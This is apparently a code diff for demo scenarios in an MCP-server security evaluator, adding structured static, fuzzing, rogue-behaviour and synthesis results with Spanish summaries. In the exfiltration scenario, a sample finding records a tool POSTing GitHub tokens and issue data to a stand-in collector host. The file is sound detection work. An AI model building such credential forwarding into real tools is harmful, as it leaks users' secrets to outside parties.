@@ -37,6 +37,51 @@ const staticNote = (files: number, sinks: number) => [
   },
 ];
 
+
+// Agent outputs follow the json_schema of each persona in config/samples, so
+// the UI reads demo and live results the same way.
+const sastOut = (score: number, deps: number, dangerous: boolean, runtime = "node") => ({
+  score,
+  dangerousSinksFound: dangerous,
+  runtime,
+  criticalVulnerabilities: [],
+  findings: [],
+  dependencyAudit: { totalDependencies: deps, unpinned: [], suspicious: [], installScripts: [] },
+});
+
+const fuzzOut = (tools: string[], cases: number, crashes = 0, leaks = 0, avgMs = 40) => ({
+  reliabilityScore: 90 - crashes * 20,
+  handshake: { succeeded: true, protocolVersion: "2025-06-18", serverName: "", serverVersion: "", usedFallbackVersion: false, notes: "" },
+  surface: { tools: tools.length, prompts: 0, resources: 0, toolNames: tools },
+  fuzzing: { casesExecuted: cases, crashes, hangs: 0, malformedResponses: 0, acceptedInvalidInputs: 1, informationLeaks: leaks },
+  latency: { avgMs, p95Ms: avgMs * 3, maxMs: avgMs * 6, slowTools: [] },
+  findings: [],
+});
+
+const rogueOut = (tools: number, summary: string, vectors: unknown[] = [], exfil = false) => ({
+  rogueScore: exfil ? 15 : 95,
+  isMalicious: exfil,
+  promptInjectionDetected: false,
+  exfiltrationAttemptDetected: exfil,
+  ssrfOrHostReadDetected: false,
+  silentSecondaryActionsDetected: exfil,
+  unsolicitedServerRequests: exfil ? ["POST https://hooks.collector-demo.net/i"] : [],
+  toolsProbed: tools,
+  vectors,
+  summary,
+});
+
+const synthOut = (safety: number, reliability: number, risk: string, summary: string, confidence = "High") => ({
+  safetyScore: safety,
+  reliabilityScore: reliability,
+  riskCategory: risk,
+  confidence,
+  agentCoverage: { static: true, dynamic: true, adversarial: true },
+  findings: [],
+  remediationPlan: [],
+  summary,
+});
+
 const latency = (llm: number, vigil = 0) => ({ vigil, occludra: 6, netbird: 3, llm });
 
 // --- 1. approved ------------------------------------------------------------
@@ -49,7 +94,7 @@ function approved(): Scenario {
   s.agent(SAST, {
     ms: 7800,
     notes: staticNote(38, 6),
-    result: { riskLevel: "Low", issues: 2 },
+    result: sastOut(84, 14, false),
     extras: { latencyMs: latency(6100), promptBytes: 61_440, redactions: [{ detector: "email", count: 1, examples: ["m***@a***.com"] }] },
   });
   s.agent(FUZZ, {
@@ -59,7 +104,7 @@ function approved(): Scenario {
       { source: "advertised-surface", units: 14, ms: 900 },
       { source: "fuzz-responses", units: 38, ms: 1700 },
     ],
-    result: { crashes: 0, protocolViolations: 1 },
+    result: fuzzOut(["read_file", "write_file", "list_directory"], 72),
     extras: { latencyMs: latency(5400, 2600), promptBytes: 48_210, redactions: [] },
   });
   s.agent(ROGUE, {
@@ -68,10 +113,10 @@ function approved(): Scenario {
       { source: "advertised-surface", units: 14, ms: 800 },
       { source: "probe-responses", units: 22, ms: 1200 },
     ],
-    result: { rogueBehaviour: false },
+    result: rogueOut(3, "Las tres herramientas hacen solo lo que dicen: leen y escriben dentro del directorio permitido."),
     extras: { latencyMs: latency(6300, 2000), promptBytes: 39_870, redactions: [] },
   });
-  s.agent(SYNTH, { ms: 6400, result: { safetyScore: 88 }, extras: { latencyMs: latency(5900), promptBytes: 21_300, redactions: [] } });
+  s.agent(SYNTH, { ms: 6400, result: synthOut(88, 91, "Safe", "Acceso a disco limitado a los directorios permitidos; sin comportamiento oculto ni salida de datos."), extras: { latencyMs: latency(5900), promptBytes: 21_300, redactions: [] } });
   s.complete(
     {
       safetyScore: 88,
@@ -111,7 +156,7 @@ function vigilBlock(): Scenario {
   s.agent(SAST, {
     ms: 7200,
     notes: staticNote(12, 2),
-    result: { riskLevel: "High", issues: 1 },
+    result: sastOut(55, 6, true, "python"),
     extras: { latencyMs: latency(5600), promptBytes: 18_400, redactions: [] },
   });
   s.status({ phase: "Evaluating", currentAgent: FUZZ.name, message: `running agent ${FUZZ.name}` });
@@ -139,7 +184,7 @@ function exfiltration(): Scenario {
   s.agent(SAST, {
     ms: 8400,
     notes: staticNote(27, 9),
-    result: { riskLevel: "High", issues: 3 },
+    result: sastOut(30, 22, true),
     extras: {
       latencyMs: latency(6900),
       promptBytes: 52_100,
@@ -169,7 +214,7 @@ function exfiltration(): Scenario {
       },
       { source: "fuzz-responses", units: 26, ms: 1400 },
     ],
-    result: { crashes: 0, protocolViolations: 0 },
+    result: fuzzOut(["sync_issue", "list_issues"], 48, 0, 1, 120),
     extras: { latencyMs: latency(5100, 2300), promptBytes: 33_600, redactions: [{ detector: "bearer-token", count: 2, examples: ["Bearer ****…****"] }] },
   });
   s.agent(ROGUE, {
@@ -178,7 +223,24 @@ function exfiltration(): Scenario {
       { source: "advertised-surface", units: 11, ms: 800 },
       { source: "probe-responses", units: 30, ms: 1500 },
     ],
-    result: { rogueBehaviour: true, channel: "outbound-http" },
+    result: rogueOut(
+      2,
+      "sync_issue manda una copia de cada issue, con el token de GitHub, a un servidor que no aparece en ningún lado.",
+      [
+        {
+          id: "R1",
+          severity: "Critical",
+          vectorType: "credential-exfiltration",
+          tool: "sync_issue",
+          payloadOrTrigger: "sync_issue({ title: \"test\" })",
+          evidence: "POST https://hooks.collector-demo.net/i  Authorization: Bearer ghp_****a91F  {\"title\":\"test\",\"author\":\"a***@e***.com\"}",
+          confirmed: true,
+          description: "Cada llamada reenvía el issue y el token a un host externo.",
+          remediation: "Eliminar el envío.",
+        },
+      ],
+      true,
+    ),
     extras: {
       latencyMs: latency(7300, 2300),
       promptBytes: 44_900,
@@ -188,7 +250,7 @@ function exfiltration(): Scenario {
       ],
     },
   });
-  s.agent(SYNTH, { ms: 6900, result: { safetyScore: 23 }, extras: { latencyMs: latency(6400), promptBytes: 26_000, redactions: [] } });
+  s.agent(SYNTH, { ms: 6900, result: synthOut(23, 70, "Untrusted", "sync_issue reenvía el token de GitHub y los datos de cada issue a un host externo no declarado."), extras: { latencyMs: latency(6400), promptBytes: 26_000, redactions: [] } });
   s.complete(
     {
       safetyScore: 23,
@@ -230,7 +292,7 @@ function degraded(): Scenario {
   s.agent(SAST, {
     ms: 7600,
     notes: staticNote(21, 3),
-    result: { riskLevel: "Medium", issues: 2 },
+    result: sastOut(68, 9, true),
     extras: { latencyMs: latency(6000), promptBytes: 29_700, redactions: [{ detector: "password-context", count: 1, examples: ["password: ********"] }] },
   });
   s.agent(FUZZ, {
@@ -249,10 +311,10 @@ function degraded(): Scenario {
       { source: "advertised-surface", units: 8, ms: 700 },
       { source: "probe-responses", units: 19, ms: 1100 },
     ],
-    result: { rogueBehaviour: false },
+    result: rogueOut(2, "create_note y search_notes no hicieron nada fuera de lo anunciado."),
     extras: { latencyMs: latency(6100, 1800), promptBytes: 31_000, redactions: [] },
   });
-  s.agent(SYNTH, { ms: 6200, result: { safetyScore: 61 }, extras: { latencyMs: latency(5800), promptBytes: 18_000, redactions: [] } });
+  s.agent(SYNTH, { ms: 6200, result: synthOut(61, 48, "Caution", "Sin señales de comportamiento malicioso, pero falta la evidencia de fuzzing: el puntaje es conservador.", "Low"), extras: { latencyMs: latency(5800), promptBytes: 18_000, redactions: [] } });
   s.complete(
     {
       safetyScore: 61,
@@ -284,7 +346,7 @@ function degraded(): Scenario {
 function background(): Scenario {
   const s = new Script(server("calendar-mcp", "https://github.com/mcp-demo/calendar-mcp.git", { schedule: "*/30 * * * *" }));
   s.prelude();
-  s.agent(SAST, { ms: 14_000, notes: staticNote(33, 4), result: { riskLevel: "Low" }, extras: { latencyMs: latency(12_000), redactions: [] } });
+  s.agent(SAST, { ms: 14_000, notes: staticNote(33, 4), result: sastOut(80, 11, false), extras: { latencyMs: latency(12_000), redactions: [] } });
   s.agent(FUZZ, {
     ms: 22_000,
     notes: fuzzNotes(["create_event", "list_events", "delete_event"]),
@@ -292,7 +354,7 @@ function background(): Scenario {
       { source: "advertised-surface", units: 12, ms: 1100 },
       { source: "fuzz-responses", units: 40, ms: 2100 },
     ],
-    result: { crashes: 0 },
+    result: fuzzOut(["create_event", "list_events", "delete_event"], 66),
     extras: { latencyMs: latency(18_000, 3200), redactions: [{ detector: "phone-intl", count: 2, examples: ["+54 9 *** ***-**12"] }] },
   });
   s.agent(ROGUE, {
@@ -301,10 +363,10 @@ function background(): Scenario {
       { source: "advertised-surface", units: 12, ms: 1000 },
       { source: "probe-responses", units: 25, ms: 1600 },
     ],
-    result: { rogueBehaviour: false },
+    result: rogueOut(3, "Sin comportamiento oculto."),
     extras: { latencyMs: latency(17_000, 2600), redactions: [] },
   });
-  s.agent(SYNTH, { ms: 12_000, result: { safetyScore: 79 }, extras: { latencyMs: latency(11_000), redactions: [] } });
+  s.agent(SYNTH, { ms: 12_000, result: synthOut(79, 83, "Safe", "Sin hallazgos relevantes."), extras: { latencyMs: latency(11_000), redactions: [] } });
   s.complete({ safetyScore: 79, reliabilityScore: 83, riskCategory: "Safe", summary: "Sin hallazgos relevantes." }, [
     { agent: "mcp-fuzz-tester", severity: "Low", title: "delete_event no pide confirmación", remediation: "Agregar un parámetro confirm." },
   ]);
@@ -320,7 +382,7 @@ export const DEMO_AGENTS: OpenCodeAgent[] = SUITE.map((a) => ({
   metadata: { name: a.name, namespace: "mcp-evals" },
   spec: {
     role: a.role,
-    model: { providerID: "opencode", modelID: MODEL.split("/")[1] ?? MODEL },
+    model: { providerID: "local", modelID: MODEL.split("/")[1] ?? MODEL },
     config: { timeoutMs: 120_000, retryCount: 2 },
     systemPrompt: `${a.role} persona (config/samples)`,
     outputFormat: { type: "json_schema", schema: {} },
